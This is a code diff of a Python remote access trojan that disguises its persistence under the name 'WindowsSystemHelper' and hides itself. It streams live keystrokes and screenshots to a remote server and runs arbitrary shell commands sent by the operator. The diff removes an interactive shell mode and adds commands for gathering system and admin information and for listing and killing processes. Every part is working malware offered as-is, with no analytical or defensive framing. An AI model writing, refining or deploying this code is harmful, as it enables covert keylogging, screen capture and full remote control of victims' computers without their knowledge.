@@ -16,7 +16,6 @@ TASK_NAME = "WindowsSystemHelper"
 
 viewing = False
 keylogging = False
-in_shell = False
 
 def hide_itself():
     try:
@@ -69,7 +68,7 @@ def live_keylogger(client):
     def on_key(event):
         if keylogging:
             try:
-                client.send(f"[LIVE KEY] {event.name}\n".encode('utf-8', errors='ignore'))
+                client.send(f"[KEY] {event.name}\n".encode())
             except:
                 pass
     keyboard.on_release(on_key)
@@ -91,7 +90,7 @@ def send_screenshot(client):
             break
 
 def connect_to_vps():
-    global viewing, keylogging, in_shell
+    global viewing, keylogging
     while True:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -101,48 +100,32 @@ def connect_to_vps():
                 cmd = client.recv(8192).decode('utf-8', errors='ignore').strip()
                 if not cmd: continue
 
-                if cmd.lower() == 'exit':
-                    client.close()
-                    return
-
-                elif cmd == 'shell':
-                    in_shell = True
-                    client.send(b'[+] Interactive Shell Started. Type "end" to exit.')
-                    while in_shell:
-                        try:
-                            shell_cmd = client.recv(8192).decode('utf-8', errors='ignore').strip()
-                            if shell_cmd.lower() == 'end':
-                                in_shell = False
-                                client.send(b'[+] Shell Ended')
-                                break
-                            if shell_cmd:
-                                output = subprocess.getoutput(shell_cmd)
-                                client.send((output or '[+] Done').encode('utf-8', errors='ignore'))
-                        except:
-                            break
-
-                elif cmd == 'view':
+                if cmd == 'view':
                     viewing = True
                     threading.Thread(target=send_screenshot, args=(client,), daemon=True).start()
-                    client.send(b'[+] Live View Started')
+                    client.send(b'[+] View Started')
 
                 elif cmd == 'stopview':
                     viewing = False
-                    client.send(b'[+] Live View Stopped')
+                    client.send(b'[+] View Stopped')
 
                 elif cmd == 'keylog start':
                     keylogging = True
                     threading.Thread(target=live_keylogger, args=(client,), daemon=True).start()
-                    client.send(b'[+] Live Keylogger Started')
+                    client.send(b'[+] Keylogger Started')
 
                 elif cmd == 'keylog stop':
                     keylogging = False
-                    client.send(b'[+] Live Keylogger Stopped')
+                    client.send(b'[+] Keylogger Stopped')
 
-                elif cmd == 'help':
-                    client.send(b"""Commands:
-help, shell, end, view, stopview, screenshot, sysinfo, processes, kill <pid>,
-keylog start, keylog stop, clipboard, killchrome, lock, restart, shutdown""")
+                elif cmd == 'sysinfo':
+                    client.send(f"User: {os.getenv('USERNAME')}\nAdmin: {is_admin()}".encode())
+
+                elif cmd == 'processes':
+                    client.send(subprocess.getoutput('tasklist').encode())
+
+                elif cmd.startswith('kill '):
+                    client.send(subprocess.getoutput(f'taskkill /F /PID {cmd.split()[1]}').encode())
 
                 else:
                     output = subprocess.getoutput(cmd)
